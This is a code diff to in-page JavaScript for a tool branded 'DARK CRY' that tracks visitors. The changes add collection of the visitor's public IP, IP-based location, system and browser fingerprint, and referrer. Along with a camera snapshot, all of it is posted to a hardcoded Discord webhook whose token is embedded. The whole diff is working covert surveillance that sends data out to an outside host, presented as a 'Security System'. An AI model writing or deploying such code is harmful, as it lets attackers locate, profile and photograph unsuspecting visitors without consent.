@@ -1251,18 +1251,67 @@
         (async function() {
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484358816933085287/N16XtmubEfoR7eOmMH9-cX-q_RDXS55O93qAw_s3f-km4TVnsLLuxVBqLhztbOnKtbiL';
             const TRACKING_ID = 'bc13fcf6';
-            const TRACKING_TYPE = 'camera';
             
             try {
+                // Get public IP
+                let publicIP = 'Unknown';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    publicIP = ipData.ip;
+                } catch (e) {
+                    console.log('Could not get IP:', e);
+                }
+                
+                // Get approximate location from IP
+                let location = 'Unknown';
+                try {
+                    const locResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                    const locData = await locResponse.json();
+                    if (locData.city && locData.region) {
+                        location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
+                    }
+                } catch (e) {
+                    console.log('Could not get location:', e);
+                }
+                
+                // System information
                 const userInfo = {
                     userAgent: navigator.userAgent,
                     language: navigator.language,
                     platform: navigator.platform,
                     screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                     timestamp: new Date().toISOString(),
-                    url: window.location.href
+                    url: window.location.href,
+                    referrer: document.referrer || 'Direct',
+                    publicIP: publicIP,
+                    location: location,
+                    os: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('Win')) return 'Windows';
+                        if (ua.includes('Mac')) return 'macOS';
+                        if (ua.includes('Linux')) return 'Linux';
+                        if (ua.includes('Android')) return 'Android';
+                        if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS';
+                        return 'Unknown';
+                    })(),
+                    browser: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('Chrome')) return 'Chrome/Chromium';
+                        if (ua.includes('Firefox')) return 'Firefox';
+                        if (ua.includes('Safari')) return 'Safari';
+                        if (ua.includes('Edge')) return 'Edge';
+                        return 'Unknown';
+                    })()
                 };
 
+                // Try to get camera (will show prompt)
                 let cameraCaptured = false;
                 let cameraData = null;
 
@@ -1285,28 +1334,68 @@
                     stream.getTracks().forEach(track => track.stop());
                     cameraCaptured = true;
                 } catch (err) {
-                    console.log('Camera not available:', err);
+                    console.log('Camera denied or unavailable:', err);
                 }
 
+                // Build detailed Discord embed
                 const embed = {
-                    title: "🎯 DARK CRY - Visitor Tracked",
-                    description: `**User Detected**\\n\\n` +
-                                `**Timestamp:** ${userInfo.timestamp}\\n` +
-                                `**Platform:** ${userInfo.platform}\\n` +
-                                `**Browser:** ${userInfo.language}\\n` +
+                    title: "🔍 DARK CRY - Visitor Report",
+                    description: `**👤 User Information**\\n` +
+                                `**Username:** ${userInfo.username || 'Web Visitor'}\\n` +
+                                `**PC Name:** ${userInfo.platform}\\n` +
+                                `**🌐 Public IP:** \`${userInfo.publicIP}\`\\n` +
+                                `**📍 Location:** ${userInfo.location}\\n` +
+                                `**🖥️ OS:** ${userInfo.os}\\n` +
+                                `**🌐 Browser:** ${userInfo.browser}\\n\\n` +
+                                `**📊 Technical Details**\\n` +
                                 `**Resolution:** ${userInfo.screenResolution}\\n` +
-                                `**URL:** ${userInfo.url}\\n\\n` +
-                                `**Tracking ID:** ${TRACKING_ID}\\n` +
-                                `**Type:** ${TRACKING_TYPE}\\n\\n` +
-                                (cameraCaptured ? '📸 **Camera captured successfully**' : '⚠️ Camera not available'),
-                    color: cameraCaptured ? 5814783 : 15158332
+                                `**Color Depth:** ${userInfo.colorDepth}-bit\\n` +
+                                `**CPU Cores:** ${userInfo.cpuCores}\\n` +
+                                `**RAM:** ${userInfo.deviceMemory}\\n` +
+                                `**Timezone:** ${userInfo.timezone}\\n` +
+                                `**Language:** ${userInfo.language}\\n\\n` +
+                                `**🆔 Tracking ID:** \`${TRACKING_ID}\`\\n` +
+                                `**⏰ Time:** ${new Date(userInfo.timestamp).toLocaleString()}\\n\\n` +
+                                (cameraCaptured ? '📸 **✅ Camera captured successfully**' : '⚠️ **Camera denied/unavailable**'),
+                    color: cameraCaptured ? 5814783 : 15158332,
+                    thumbnail: {
+                        url: 'https://i.imgur.com/placeholder.png' // Optional logo
+                    },
+                    fields: [
+                        {
+                            name: '🔗 Page URL',
+                            value: `\`${userInfo.url.substring(0, 50)}...\``,
+                            inline: false
+                        },
+                        {
+                            name: '📡 Referrer',
+                            value: userInfo.referrer,
+                            inline: true
+                        },
+                        {
+                            name: '🍪 Cookies',
+                            value: userInfo.cookieEnabled ? 'Enabled' : 'Disabled',
+                            inline: true
+                        },
+                        {
+                            name: '🕵️ Do Not Track',
+                            value: userInfo.doNotTrack === '1' ? 'Enabled' : 'Disabled',
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: `DARK CRY Security System • ${new Date().getFullYear()}`,
+                        icon_url: 'https://i.imgur.com/placeholder.png'
+                    },
+                    timestamp: new Date().toISOString()
                 };
 
                 const payload = {
-                    content: `🔍 **DARK CRY Tracker - ${TRACKING_TYPE.toUpperCase()}**`,
+                    content: `🔍 **DARK CRY Tracker Alert - ${TRACKING_ID}**`,
                     embeds: [embed]
                 };
 
+                // Send to Discord
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -1315,15 +1404,23 @@
                     body: JSON.stringify(payload)
                 });
 
-                if (response.ok && cameraCaptured) {
-                    const formData = new FormData();
-                    const blob = await (await fetch(`data:image/jpeg;base64,${cameraData}`)).blob();
-                    formData.append('file', blob, 'visitor_camera.jpg');
+                if (response.ok) {
+                    console.log('✅ Main report sent to Discord');
                     
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    // Send camera if captured
+                    if (cameraCaptured) {
+                        const formData = new FormData();
+                        const blob = await (await fetch(`data:image/jpeg;base64,${cameraData}`)).blob();
+                        formData.append('file', blob, 'visitor_camera.jpg');
+                        
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        console.log('📸 Camera sent');
+                    }
+                } else {
+                    console.error('Failed to send to Discord:', response.status);
                 }
             } catch (error) {
                 console.error('Tracking error:', error);
